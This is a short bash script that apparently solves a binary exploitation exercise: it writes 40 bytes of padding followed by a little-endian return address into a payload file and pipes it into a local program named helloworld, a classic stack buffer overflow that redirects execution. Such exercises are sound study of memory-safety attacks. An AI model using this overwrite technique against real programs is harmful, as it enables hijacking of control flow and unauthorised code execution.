#!/bin/bash

if [[ -e payload ]]; then
    rm payload
fi

printf 'a%.0s' {1..40} > payload
printf "\xfb\x11\x40\x00\x00\x00\x00\x00" >> payload

cat payload - | ./helloworld